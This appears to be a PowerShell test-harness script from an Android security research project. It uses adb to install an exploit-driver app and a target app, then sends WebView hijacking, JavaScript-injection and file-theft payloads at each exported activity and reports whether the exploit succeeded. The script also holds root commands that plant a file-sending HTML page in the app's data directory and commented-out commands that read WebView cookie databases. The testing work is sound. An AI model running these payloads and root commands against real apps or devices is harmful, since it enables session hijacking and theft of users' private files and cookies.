# If(-not(Get-InstalledModule PSSQLite -ErrorAction silentlycontinue)){
#     Install-Module PSSQLite -Confirm:$False -Force
# }
# Import-Module PSSQLite
function attackXSS {
    param (
        $class_options
    )
    # Clear-Host
    for($i = 0; $i -lt $class_options.count; $i++){
        Write-Host "$($i): $($class_options[$i])"
    }
    $defaultValue = "BYPASS"
    $selection = Read-Host -Prompt "Specify class to attack [Enter to test all]"
    $selection = ($defaultValue,$selection)[[bool]$selection]

    if ($IsWindows -or $ENV:OS) {
        $DevaaFolder = "C:\Users\elbon\Documents\GitHub\Devaa++"
    } else {
        $DevaaFolder = "/usr/local/codeql-home/codeql-repo/java/ql/test/query-tests/security/Devaa"
    }
    function Show-Menu {
        param (
            [string]$Title = 'Attacks List'
        )
        Write-Host "================ $Title ================"
        # Webview Hijacking
        Write-Host "1: Enter URL to query"
        # Javascript based (Token stealing)
        Write-Host "2: Javascript interface"
        # File Theft
        Write-Host "3: Send user profile"
        Write-Host "Q: Press 'Q' to quit"
    }

    # $query = Read-Host -Prompt 'Enter an XSS attack query'
    $packageString = aapt dump badging "$($DevaaFolder)/testRepo/app/build/outputs/apk/debug/app-debug.apk" | grep "package:\ name"
    $packageName = $packageString.Split("'")[1]
    $debugName = "app.swag.testcasedriver"

    # Write-Output $class_options

    adb uninstall $packageName
    adb uninstall $debugName
    adb install -g "$($DevaaFolder)/exploit_engine/app-debug.apk"
    adb install -g "$($DevaaFolder)/testRepo/app/build/outputs/apk/debug/app-debug.apk"

    adb shell pm clear $debugName
    adb shell pm clear $packageName
    Write-Host $packageName
    # $allOutput = adb install -g app-debug.apk 2>&1
    # $stderr = $allOutput | ?{ $_ -is [System.Management.Automation.ErrorRecord] }
    # $stdout = $allOutput | ?{ $_ -isnot [System.Management.Automation.ErrorRecord]
# javascript:alert\(1\)
    # adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "https://www.zoho.com" --es className "com.vuldroid.application.YoutubeViewer" --es packageName "com.vuldroid.application" --es domain "https://zoho.com/"
    if ($selection -ne "BYPASS"){
       $class_options = @($class_options[$selection])
    }
    
    $payload = ""
    Show-Menu
    $selection = Read-Host "Please make a selection"
    
    switch ($selection)
    {
    # https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892
    '1' {
        # doesn’t work for component exported by intent filter
        # $payload = Read-Host -Prompt 'Enter URL?'
        $payload = "http://127.0.0.1:4444/evil"
    } '2' {
        $payload = "javascript:alert\(1\)"
        # add in other payloads and change which style works
    }'3' {
        $payload= "file:///data/data/$packageName/FakerActivity.html"
        $html_content=(Get-Content -path $DevaaFolder/extra_payloads/file_send.html -Raw) -replace 'DEVAA_VAR', "$packageName"
        $html_content | out-file -filepath "/tmp/FakerActivity.html"
        adb push "$DevaaFolder/extra_payloads/file_send.html" '/sdcard/'
        adb push "$DevaaFolder/extra_payloads/shared_prefs" '/sdcard/'
        adb push "/tmp/FakerActivity.html" '/sdcard/'
        adb shell su -c "mv /sdcard/FakerActivity.html /data/data/$packageName/FakerActivity.html"
        adb shell su -c "mv /sdcard/shared_prefs /data/data/$packageName/"
        adb shell su -c "chmod 777 /data/data/$packageName/FakerActivity.html"
        adb shell su -c "chmod 777 /data/data/$packageName/shared_prefs/FakerActivity.xml"
        # setAllowUniversalAccessFromFileURLs

        # adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "file:///data/data/com.vuldroid.application/files/example.txt" --es className "com.vuldroid.application.YoutubeViewer" --es packageName "com.vuldroid.application" --es domain "https://zoho.com/"
    }
    }
    
    if($selection -ne 'q'){
        adb reverse --remove-all
        adb reverse tcp:4444 tcp:8888
        #ensure we get a response even if an error's returned
        $Response = try { 
            (Invoke-WebRequest -Uri 'http://127.0.0.1:8888/reset' -ErrorAction Stop).BaseResponse
        } catch [System.Net.WebException] { 
            Write-Verbose "An exception was caught: $($_.Exception.Message)"
            $_.Exception.Response 
        } 
        #then convert the status code enum to int by doing this
        $statusCodeInt = [int]$response.BaseResponse.StatusCode
        if($statusCodeInt -gt 400){
            # nohup python "$DevaaFolder/server/server.py" &
            throw 'The server is unreachable'
        }
        Foreach ($className in $class_options)
        {
            adb shell input keyevent KEYCODE_WAKEUP
            # adb install -g "$($DevaaFolder)/exploit_engine/app-debug.apk"
            Write-Host $className
            # adb shell run-as $packageName pm clear $packageName
            # adb shell su -c "rm /data/data/$($packageName)/app_webview/Default/Cookies"
            adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "$($payload)" --es className "$($className)" --es packageName "$($packageName)" --es domain "$($payload)"
            Start-Sleep -s 5
            $Response = Invoke-WebRequest -URI "http://127.0.0.1:8888/last"
            adb shell input keyevent KEYCODE_HOME
            # root force-stop
            $kpid = adb shell pidof app.swag.testcasedriver
            adb shell am kill $kpid
            if ("$Response" -eq "True"){
                Write-Error "❌ Test failed: Exploit successful" -ErrorId V1
            }
            else{
                Write-Host "✅ Test Passed: Vulnerability could not be exploited"
            }
            adb shell pm clear $debugName
            adb shell pm clear $packageName

            # # COOKIE STUFF
            # # adb shell pm disable $debugName
            # Start-Sleep -s 60
            # $adb_command = "sqlite3 /data/data/$packageName/app_webview/Default/Cookies \'SELECT \* FROM cookies\'"
            # # WHERE host_key LIKE \'$($payload.Split(".")[1])\'
            # $sql_response = adb shell su -c "$adb_command"
            # $pattern = $($payload.Split(".")[1])
            # if ($selection -ne '1'){
            #     $pattern = "zoho"
            # }
            # $measureResponse = Select-String -InputObject $sql_response -Pattern "$pattern" -AllMatches
            # if ($measureResponse.Matches.Count -gt 0){
            #     Write-Error "❌ Test failed: Exploit successful" -ErrorId V1
            # }
            # else{
            #     Write-Host "✅ Test Passed: Vulnerability could not be exploited"
            # }
            # adb shell pm clear $debugName
            # adb shell pm clear $packageName
            # # adb uninstall $debugName
            
            # Start-Sleep -s 60
            # $adbData = adb shell "run-as $packageName sh -c 'cat /data/data/$packageName/app_webview/Default/Cookies'" 
                    # WILL probably have to find all Cookie named locations and cat wildacrd their content unless something else found
            # $Database = "$DevaaFolder/Cookies"
            
            # $adbData = adb shell "run-as $packageName sh -c 'grep -o '$($payload.Split(".")[1])' /data/data/$packageName/app_webview/Default/Cookies | wc -l'" 
            # Write-Host $adbData
            
            # /data/user/0
            # $query = "SELECT COUNT(*) FROM cookies WHERE host_key LIKE '%$($payload.Split(".")[1])%'"
            # $adbData > $Database
            # adb push sqlite3 /data/local/tmp
            # https://stackoverflow.com/a/60892396 arm64
            # sqlite3 Cookies "select * from cookies where host_key like '%zoho%'"
            # sqlite3 $Database $query
            # $queryResults = Invoke-SqliteQuery -Query $query -DataSource $Database
            # Write-Host $queryResults   
        }
        adb reverse --remove-all
    }
}